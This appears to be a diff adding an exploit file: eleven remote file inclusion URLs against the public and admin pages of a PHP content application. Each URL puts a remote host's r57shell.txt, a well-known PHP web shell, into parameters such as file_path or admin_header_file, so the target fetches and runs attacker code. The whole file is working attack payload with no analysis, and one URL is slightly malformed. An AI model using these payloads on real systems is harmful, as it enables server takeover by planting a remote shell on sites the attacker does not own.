@@ -1,0 +1,11 @@
+http://www.example.com/path/index.php?file_path=http://www.example2.com/r57shell.txt?
+http://www.example.com/path/showcatpicks.php?file_path=http://www.example2.com/r57shell.txt?
+http://www.example.com/path/showarticle.php?file_path=http://www.example2.com/r57shell.txt?
+http://www.example.com/path/admin/authors.php?admin_header_file=http://www.example2.com/r57shell.txt?
+http://www.example.com/path/admin/authors.php?admin_footer_file=http://www.example2.com/r57shell.txt?
+http://www.example.com/path/admin/articles.php?admin_footer_file=http://www.example2.com/r57shell.txt?
+http://www.example.com/path/admin/index.php?admin_header_file=http://www.example2.com/r57shell.txt?
+http://www.example.com/path/admin/categories.php?admin_header_file=http://www.example2.com/r57shell.txt?
+http://www.example.com/path/admin/categories.php?admin_footer_file=http://www.example2.com/r57shell.txt?
+http://www.example.com/path/admin/editconfig.php?admin_header_file=http://www.example2.com/r57shell.txt?
+http://www.example.com/path/admin/editconfig.phpadmin_footer_file=http://www.example2.com/r57shell.txt?
